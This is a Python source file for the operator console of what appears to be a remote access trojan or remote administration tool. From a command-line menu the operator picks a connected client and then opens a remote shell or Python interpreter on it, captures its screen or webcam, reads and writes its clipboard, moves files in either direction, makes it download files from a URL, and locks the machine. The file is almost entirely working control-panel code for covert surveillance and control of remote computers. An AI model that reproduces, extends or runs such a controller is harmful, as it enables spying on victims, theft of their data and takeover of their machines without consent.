import cmd
import logging
import socket
from contextlib import suppress

from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from modules import clipboard, download, filetransfer, screenshot, webcam, windows
from modules.baseserver import BaseServer
from utils import terminal
from utils.prompts import increase_timeout_prompt

# Enables using arrowkeys on unix-like systems
with suppress(ImportError):
    import readline

logging.basicConfig(level=logging.DEBUG)
socket.setdefaulttimeout(10)

DEFAULT_PROMPT = "> "

MENU_HELP = """
Commands:

list
open (ID)
shutdown
help
"""

INTERACT_HELP = """
Available commands:

ping
shell
python
screenshot
webcam
copy
paste
receive
send
download
lock (windows only)
disconnect
exit
"""


class ServerCLI(BaseServer, cmd.Cmd):
    """ CLI for BaseServer """

    prompt = DEFAULT_PROMPT
    client = None

    def __init__(self, certificate: x509.Certificate, private_key: ec.EllipticCurvePrivateKey):
        BaseServer.__init__(self, certificate, private_key)
        cmd.Cmd.__init__(self)

    def default(self, _) -> None:
        """ Default error if command not found """
        print('Command was not recognized, type "help" for help.')

    def do_shutdown(self, _) -> bool:
        """ Shutdown the server """
        self.shutdown()
        return True

    def do_ping(self, _) -> None:
        """ Get client latency """
        if self.__check_select(): return

        try:
            latency = self.ping(self.client)
        except TimeoutError:
            print("Client timed out.")
        else:
            print(f'Ping: {latency}ms')

    def do_help(self, _) -> None:
        """ Print help message """
        if self.client is None:
            print(MENU_HELP)
        else:
            print(INTERACT_HELP)

    def __check_select(self) -> bool | None:
        """ Check if a client is selected """
        if self.client is None:
            print("Select a client first.")
            return True

    def do_open(self, select_id) -> None:
        """ Interact with a client """
        if self.client is not None:
            print('A client has already been selected.')
            return

        # Create a copy of the clients list
        # This ensures the list is looped through entirely
        # as some items may be otherwise removed mid loop
        clients = self.clients.copy()

        # Check if the given id matches a client.id
        for client in clients:
            if client.id == select_id:
                self.client = client
                break

        if self.client is None:
            print('Invalid client ID')
            return

        self.prompt = f'{self.client.address[0]}> '

    def do_exit(self, _) -> None:
        """ Go back to the client selection menu """
        if self.client is None:
            print("No client is selected. To shutdown the server, use 'shutdown'.")
            return

        self.client = None
        self.prompt = '> '

    def do_list(self, _) -> None:
        """ CLI for list """
        clients = self.list()
        for client in clients:
            print(f'ID: {client.id} / Address: {client.address}')

    def do_shell(self, _) -> None:
        """ Open a shell to client """
        if self.__check_select(): return

        logging.debug('Launched shell (%s)', self.client.id)
        while True:
            command = input('shell> ')

            # Check for cases where command only affects output visually
            match command.strip():
                case 'exit':
                    break
                case 'clear' | 'cls':
                    terminal.clear()
                    continue

            # Check if the directory is changed, in which case it should be remembered
            comm, *_ = command.split()
            if comm.lower() in ['cd', 'chdir']:

                print(self.client.shell(command).decode(), end='')
                # TODO: update cwd accordingly

            # Increase timeout to 60 seconds for shell
            self.client.conn.settimeout(60)
            try:
                print(self.client.shell(command).decode(), end='')
            except TimeoutError:
                logging.info('Shell command timed out: %s', self.client.id)
                # Prompt user if they want to increase the timeout limit
                if increase_timeout_prompt():
                    # Indefinitely block for output
                    self.client.conn.settimeout(None)
                    print(self.client.read().decode(), end='')
            finally:
                # Set timeout back to default
                self.client.conn.settimeout(socket.getdefaulttimeout())

    def do_python(self, _) -> None:
        """ Open a python interpreter to client """
        if self.__check_select(): return

        logging.debug('Launched python interpreter (%s)', self.client.id)
        while True:
            command = input('>>> ')

            if command.strip().lower() in ['exit', 'exit()']:
                break

            # Increase timeout to 60 seconds for python interpreter
            self.client.conn.settimeout(60)
            try:
                print(self.client.python(command).decode(), end='')
            except TimeoutError:
                logging.info('Python command timed out: %s', self.client.id)
                # Prompt user if they want to increase the timeout limit
                if increase_timeout_prompt():
                    # Indefinitely block for output
                    self.client.conn.settimeout(None)
                    print(self.client.read().decode(), end='')
            finally:
                self.client.conn.settimeout(socket.getdefaulttimeout())

    def do_screenshot(self, _) -> None:
        """ Take a screenshot and save it in a file """
        if self.__check_select(): return

        try:
            filename = screenshot.screenshot(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Saved screenshot: {filename}')

    def do_webcam(self, _) -> None:
        """ Capture webcam """
        if self.__check_select(): return

        try:
            filename = webcam.webcam(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Saved webcam capture: {filename}')

    def do_copy(self, _) -> None:
        """ Copy to client clipboard """
        if self.__check_select(): return

        text = input('Text to copy: ')
        try:
            clipboard.copy(self.client, text)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Copied to clipboard successfully')

    def do_paste(self, _) -> None:
        """ Paste from client clipboard """
        if self.__check_select(): return

        try:
            content = clipboard.paste(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Clipboard:\n"{content}"')

    def do_receive(self, _) -> None:
        """ Receive a file from the client """
        if self.__check_select(): return

        filename = input('File to transfer: ')
        save_name = input('Save file as: ')
        try:
            filetransfer.receive(self.client, filename, save_name)
        except RuntimeError as error:
            print(str(error))
        else:
            print('File transferred successfully')

    def do_send(self, _) -> None:
        """ Send a file to client """
        if self.__check_select(): return

        filename = input('Filename: ')
        save_name = input('Save file as: ')
        try:
            filetransfer.send(self.client, filename, save_name)
        except RuntimeError as error:
            print(str(error))
        else:
            print('File transferred successfully')

    def do_download(self, _) -> None:
        """ Make the client download a file from the web """
        if self.__check_select(): return

        url = input('File URL: ')
        save_name = input('Save file as: ')
        try:
            download.download(self.client, url, save_name)
        except RuntimeError as error:
            print(str(error))
        else:
            print("Successfully downloaded file.")

    def do_lock(self, _) -> None:
        """ Lock client machine """
        if self.__check_select(): return

        try:
            windows.lock_machine(self.client)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Successfully locked client machine.')

    def do_disconnect(self, _) -> None:
        """ Disconnect a client """
        if self.__check_select(): return

        self.disconnect(self.client)
        print("Disconnected client.")
        self.client = None
        self.prompt = DEFAULT_PROMPT


if __name__ == '__main__':

    # Read certficate from file
    with open('cert.pem', 'rb') as file:
        cert = x509.load_pem_x509_certificate(file.read())

    # Read private key from file
    with open('key.pem', 'rb') as file:
        private_key = serialization.load_pem_private_key(file.read(), None)

    # Start server
    server = ServerCLI(cert, private_key)
    server.start(('localhost', 6969))

    # Get a client that connected
    connection = server.connections_queue.get()
    print(connection.id.encode())

    # Start Server CLI
    while True:
        try:
            server.cmdloop()
        except KeyboardInterrupt:
            server.client = None
            server.prompt = DEFAULT_PROMPT
            print() # Start on a new line
            continue
        else:
            break
